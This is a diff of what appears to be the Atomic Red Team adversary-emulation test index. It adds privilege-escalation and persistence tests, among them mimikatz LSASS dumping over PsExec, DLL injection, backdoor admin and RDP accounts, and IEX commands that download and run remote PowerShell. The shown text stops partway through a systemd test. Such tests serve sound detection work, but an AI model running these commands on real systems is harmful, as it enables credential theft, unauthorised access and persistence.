@@ -2390,7 +2390,7 @@ privilege-escalation:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "#{gup_executable}"
       executor:
         command: "#{gup_executable}\n"
         cleanup_command: 'taskkill /F /IM #{process_name} >nul 2>&1
@@ -2467,18 +2467,27 @@ privilege-escalation:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -2672,7 +2681,43 @@ privilege-escalation:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1055.001
+    atomic_tests:
+    - name: Process Injection via mavinject.exe
+      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+      description: |
+        Windows 10 Utility To Inject DLLS.
+
+        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+      supported_platforms:
+      - windows
+      input_arguments:
+        process_id:
+          description: PID of input_arguments
+          type: Integer
+          default: "(Start-Process notepad -PassThru).id"
+        dll_payload:
+          description: DLL to Inject
+          type: Path
+          default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
+      executor:
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
+        name: powershell
+        elevation_required: true
   T1548.004:
     technique:
       external_references:
@@ -5247,7 +5292,31 @@ privilege-escalation:
       - Travis Smith, Tripwire
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1547.010
+    atomic_tests:
+    - name: Add Port Monitor persistence in Registry
+      auto_generated_guid: d34ef297-f178-4462-871e-9ce618d44e50
+      description: Add key-value pair to a Windows Port Monitor registry. On the subsequent
+        reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
+      supported_platforms:
+      - windows
+      input_arguments:
+        monitor_dll:
+          description: Addition to port monitor registry key. Normally refers to a
+            DLL name in C:\Windows\System32. arbitrary DLL can be loaded if permissions
+            allow writing a fully-qualified pathname for that DLL.
+          type: Path
+          default: C:\Path\AtomicRedTeam.dll
+      executor:
+        command: 'reg add "hklm\system\currentcontrolset\control\print\monitors\ART"
+          /v "Atomic Red Team" /d "#{monitor_dll}" /t REG_SZ
+
+'
+        cleanup_command: 'reg delete "hklm\system\currentcontrolset\control\print\monitors\ART"
+
+'
+        name: command_prompt
+        elevation_required: true
   T1055.002:
     technique:
       external_references:
@@ -5751,11 +5820,11 @@ privilege-escalation:
         sponsor_binary_path:
           description: Path of the sponsor binary (executable that will host the binary)
           type: string
-          default: C:\Windows\System32\calc.exe
+          default: C:\Windows\System32\notepad.exe
         spawnto_process_name:
           description: Name of the process to spawn
           type: string
-          default: calc
+          default: notepad
       executor:
         command: |
           . $PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1
@@ -5768,7 +5837,7 @@ privilege-escalation:
         name: powershell
     - name: RunPE via VBA
       auto_generated_guid: 3ad4a037-1598-4136-837c-4027e4fa319b
-      description: 'This module executes calc.exe from within the WINWORD.EXE process
+      description: 'This module executes notepad.exe from within the WINWORD.EXE process
 
 '
       supported_platforms:
@@ -5795,8 +5864,8 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
   T1055:
@@ -5901,41 +5970,6 @@ privilege-escalation:
       x_mitre_is_subtechnique: false
       identifier: T1055
     atomic_tests:
-    - name: Process Injection via mavinject.exe
-      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
-      description: |
-        Windows 10 Utility To Inject DLLS.
-
-        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
-      supported_platforms:
-      - windows
-      input_arguments:
-        process_id:
-          description: PID of input_arguments
-          type: Integer
-          default: "(Start-Process notepad -PassThru).id"
-        dll_payload:
-          description: DLL to Inject
-          type: Path
-          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
-
-'
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
-      executor:
-        command: |
-          $mypid = #{process_id}
-          mavinject $mypid /INJECTRUNNING #{dll_payload}
-        name: powershell
-        elevation_required: true
     - name: Shellcode execution via VBA
       auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
       description: |
@@ -5964,9 +5998,65 @@ privilege-escalation:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
+    - name: Remote Process Injection in LSASS via mimikatz
+      auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
+      description: |
+        Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
+        It must be executed in the context of a user who is privileged on remote `machine`.
+
+        The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
+      supported_platforms:
+      - windows
+      input_arguments:
+        machine:
+          description: machine to target (via psexec)
+          type: string
+          default: DC1
+        mimikatz_path:
+          description: Mimikatz windows executable
+          type: path
+          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+        psexec_path:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
+
+'
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        command: '#{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa
+          /inject /id:500" "exit"
+
+'
+        name: command_prompt
+        elevation_required: false
   T1055.008:
     technique:
       external_references:
@@ -6368,7 +6458,7 @@ privilege-escalation:
       executor:
         command: |
           $RunOnceKey = "#{reg_key_path}"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
         cleanup_command: 'Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun"
           -Force -ErrorAction Ignore
 
@@ -6725,10 +6815,29 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
+    - name: WMI Invoke-CimMethod Scheduled Task
+      auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
+      description: 'Create an scheduled task that executes notepad.exe after user
+        login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing
+        as Register-ScheduledTask cmdlet behind the scenes.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
+          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
+          >$null 2>&1
+
+'
   T1053:
     technique:
       created: '2017-05-31T21:30:46.977Z'
@@ -7768,7 +7877,58 @@ privilege-escalation:
       - root
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1053.006
+    atomic_tests:
+    - name: Create Systemd Service and Timer
+      auto_generated_guid: f4983098-bb13-44fb-9b2c-46149961807b
+      description: "This test creates Systemd service and timer then starts and enables
+        the Systemd timer \n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_systemd_service:
+          description: Path to systemd service unit file
+          type: Path
+          default: "/etc/systemd/system/art-timer.service"
+        path_to_systemd_timer:
+          description: Path to service timer file
+          type: Path
+          default: "/etc/systemd/system/art-timer.timer"
+        systemd_service_name:
+          description: Name of systemd service
+          type: String
+          default: art-timer.service
+        systemd_timer_name:
+          description: Name of systemd service timer
+          type: String
+          default: art-timer.timer
+      executor:
+        command: |
+          echo "[Unit]" > #{path_to_systemd_service}
+          echo "Description=Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_service}
+          echo "[Service]" >> #{path_to_systemd_service}
+          echo "Type=simple" >> #{path_to_systemd_service}
+          echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> #{path_to_systemd_service}
+          echo "[Install]" >> #{path_to_systemd_service}
+          echo "WantedBy=multi-user.target" >> #{path_to_systemd_service}
+          echo "[Unit]" > #{path_to_systemd_timer}
+          echo "Description=Executes Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_timer}
+          echo "Requires=#{systemd_service_name}" >> #{path_to_systemd_timer}
+          echo "[Timer]" >> #{path_to_systemd_timer}
+          echo "Unit=#{systemd_service_name}" >> #{path_to_systemd_timer}
+          echo "OnCalendar=*-*-* *:*:00" >> #{path_to_systemd_timer}
+          echo "[Install]" >> #{path_to_systemd_timer}
+          echo "WantedBy=timers.target" >> #{path_to_systemd_timer}
+          systemctl start #{systemd_timer_name}
+          systemctl enable #{systemd_timer_name}
+          systemctl daemon-reload
+        cleanup_command: |
+          systemctl stop #{systemd_timer_name}
+          systemctl disable #{systemd_timer_name}
+          rm #{path_to_systemd_service}
+          rm #{path_to_systemd_timer}
+          systemctl daemon-reload
+        name: bash
   T1055.003:
     technique:
       external_references:
@@ -8023,8 +8183,8 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique NamedPipe -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -8035,8 +8195,8 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique Token -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1546.005:
@@ -10093,12 +10253,12 @@ persistence:
 
 '
         name: command_prompt
-    - name: Bits download using destktopimgdownldr.exe (cmd)
+    - name: Bits download using desktopimgdownldr.exe (cmd)
       auto_generated_guid: afb5e09e-e385-4dee-9a94-6ee60979d114
-      description: "This test simulates using destopimgdwnldr.exe to download a malicious
-        file\ninstead of a desktop or lockscreen background img. The process that
-        actually makes \nthe TCP connection and creates the file on the disk is a
-        svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
+      description: "This test simulates using desktopimgdownldr.exe to download a
+        malicious file\ninstead of a desktop or lockscreen background img. The process
+        that actually makes \nthe TCP connection and creates the file on the disk
+        is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe.
         See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n"
       supported_platforms:
       - windows
@@ -11503,7 +11663,7 @@ persistence:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "#{gup_executable}"
       executor:
         command: "#{gup_executable}\n"
         cleanup_command: 'taskkill /F /IM #{process_name} >nul 2>&1
@@ -11580,18 +11740,27 @@ persistence:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -11695,6 +11864,43 @@ persistence:
 
 '
         name: command_prompt
+        elevation_required: false
+    - name: Create a new Domain Account using PowerShell
+      auto_generated_guid: 5a3497a4-1568-4663-b12a-d4a5ed70c7d7
+      description: 'Creates a new Domain User using the credentials of the Current
+        User
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Name of the Account to be created
+          type: String
+          default: T1136.002_Admin
+        password:
+          description: Password of the Account to be created
+          type: String
+          default: T1136_pass123!
+      executor:
+        command: |
+          $SamAccountName = '#{username}'
+          $AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force
+          Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+          $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+          $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+          $User.SamAccountName = $SamAccountName
+          $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+          $User.SetPassword($TempCred.GetNetworkCredential().Password)
+          $User.Enabled = $True
+          $User.PasswordNotRequired = $False
+          $User.DisplayName = $SamAccountName
+          $User.Save()
+          $User
+        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+
+'
+        name: powershell
         elevation_required: false
   T1078.002:
     technique:
@@ -12146,13 +12352,14 @@ persistence:
 '
       dependency_executor_name: powershell
       dependencies:
-      - description: 'chrome must be installed
+      - description: 'Chrome must be installed
 
 '
-        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
-        get_prereq_command: |
-          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
-          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+          {exit 0} else {exit 1}
+        get_prereq_command: "Invoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.exe
+          #{chrome_url}\nStart-Process $env:temp\\ChromeStandaloneSetup64.exe /S     \n"
       executor:
         name: powershell
         elevation_required: true
@@ -12161,10 +12368,10 @@ persistence:
           foreach ($extension in $extList) {
             New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
             New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
-          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start chrome
           Start-Sleep -Seconds 30
           Stop-Process -Name "chrome"
-        cleanup_command: |-
+        cleanup_command: |
           $extList = #{extension_id}
           foreach ($extension in $extList) {
           Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
@@ -13794,7 +14001,27 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137
+    atomic_tests:
+    - name: Office Application Startup - Outlook as a C2
+      auto_generated_guid: bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c
+      description: "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/
+        \nit is possible to use Outlook Macro as a way to achieve persistance and
+        execute arbitrary commands. This transform Outlook into a C2.\nToo achieve
+        this two things must happened on the syste\n- The macro security registry
+        value must be set to '4'\n- A file called VbaProject.OTM must be created in
+        the Outlook Folder.\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4
+          if not exist  %APPDATA%\Microsoft\Outlook ( md %APPDATA%\Microsoft\Outlook\ )
+          echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+        cleanup_command: |
+          reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /f
+          del %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+        name: command_prompt
   T1137.001:
     technique:
       external_references:
@@ -13946,7 +14173,7 @@ persistence:
       - Office 365
       identifier: T1137.002
     atomic_tests:
-    - name: Office Apllication Startup Test Persistence
+    - name: Office Application Startup Test Persistence
       auto_generated_guid: c3e35b58-fe1c-480b-b540-7600fb612563
       description: |
         Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
@@ -14071,7 +14298,41 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137.004
+    atomic_tests:
+    - name: Install Outlook Home Page Persistence
+      auto_generated_guid: 7a91ad51-e6d2-4d43-9471-f26362f5738e
+      description: |
+        This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.
+
+        Triggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).
+      supported_platforms:
+      - windows
+      input_arguments:
+        url:
+          description: URL to Outlook Home Page containing the payload to execute
+            (can be local file:// or remote https://)
+          type: string
+          default: file://PathToAtomicsFolder\T1137.004\src\T1137.004.html
+        outlook_version:
+          description: Version of Outlook that is installed
+          type: string
+          default: 16.0
+        outlook_folder:
+          description: Name of the Outlook folder to modify the homepage setting for
+          type: string
+          default: Inbox
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder}
+          /v URL /t REG_SZ /d #{url} /f
+
+'
+        cleanup_command: 'reg.exe delete HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder}
+          /v URL /f
+
+'
   T1137.005:
     technique:
       external_references:
@@ -14658,7 +14919,31 @@ persistence:
       - Travis Smith, Tripwire
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1547.010
+    atomic_tests:
+    - name: Add Port Monitor persistence in Registry
+      auto_generated_guid: d34ef297-f178-4462-871e-9ce618d44e50
+      description: Add key-value pair to a Windows Port Monitor registry. On the subsequent
+        reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
+      supported_platforms:
+      - windows
+      input_arguments:
+        monitor_dll:
+          description: Addition to port monitor registry key. Normally refers to a
+            DLL name in C:\Windows\System32. arbitrary DLL can be loaded if permissions
+            allow writing a fully-qualified pathname for that DLL.
+          type: Path
+          default: C:\Path\AtomicRedTeam.dll
+      executor:
+        command: 'reg add "hklm\system\currentcontrolset\control\print\monitors\ART"
+          /v "Atomic Red Team" /d "#{monitor_dll}" /t REG_SZ
+
+'
+        cleanup_command: 'reg delete "hklm\system\currentcontrolset\control\print\monitors\ART"
+
+'
+        name: command_prompt
+        elevation_required: true
   T1546.013:
     technique:
       external_references:
@@ -15341,7 +15626,7 @@ persistence:
       executor:
         command: |
           $RunOnceKey = "#{reg_key_path}"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
         cleanup_command: 'Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun"
           -Force -ErrorAction Ignore
 
@@ -15779,10 +16064,29 @@ persistence:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")
-          \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
+        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
+    - name: WMI Invoke-CimMethod Scheduled Task
+      auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
+      description: 'Create an scheduled task that executes notepad.exe after user
+        login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing
+        as Register-ScheduledTask cmdlet behind the scenes.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
+          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
+          >$null 2>&1
+
+'
   T1053:
     technique:
       created: '2017-05-31T21:30:46.977Z'
@@ -16729,7 +17033,58 @@ persistence:
       - root
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1053.006
+    atomic_tests:
+    - name: Create Systemd Service and Timer
+      auto_generated_guid: f4983098-bb13-44fb-9b2c-46149961807b
+      description: "This test creates Systemd service and timer then starts and enables
+        the Systemd timer \n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_systemd_service:
+          description: Path to systemd service unit file
+          type: Path
+          default: "/etc/systemd/system/art-timer.service"
+        path_to_systemd_timer:
+          description: Path to service timer file
+          type: Path
+          default: "/etc/systemd/system/art-timer.timer"
+        systemd_service_name:
+          description: Name of systemd service
+          type: String
+          default: art-timer.service
+        systemd_timer_name:
+          description: Name of systemd service timer
+          type: String
+          default: art-timer.timer
+      executor:
+        command: |
+          echo "[Unit]" > #{path_to_systemd_service}
+          echo "Description=Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_service}
+          echo "[Service]" >> #{path_to_systemd_service}
+          echo "Type=simple" >> #{path_to_systemd_service}
+          echo "ExecStart=/bin/touch /tmp/art-systemd-timer-marker" >> #{path_to_systemd_service}
+          echo "[Install]" >> #{path_to_systemd_service}
+          echo "WantedBy=multi-user.target" >> #{path_to_systemd_service}
+          echo "[Unit]" > #{path_to_systemd_timer}
+          echo "Description=Executes Atomic Red Team Systemd Timer Service" >> #{path_to_systemd_timer}
+          echo "Requires=#{systemd_service_name}" >> #{path_to_systemd_timer}
+          echo "[Timer]" >> #{path_to_systemd_timer}
+          echo "Unit=#{systemd_service_name}" >> #{path_to_systemd_timer}
+          echo "OnCalendar=*-*-* *:*:00" >> #{path_to_systemd_timer}
+          echo "[Install]" >> #{path_to_systemd_timer}
+          echo "WantedBy=timers.target" >> #{path_to_systemd_timer}
+          systemctl start #{systemd_timer_name}
+          systemctl enable #{systemd_timer_name}
+          systemctl daemon-reload
+        cleanup_command: |
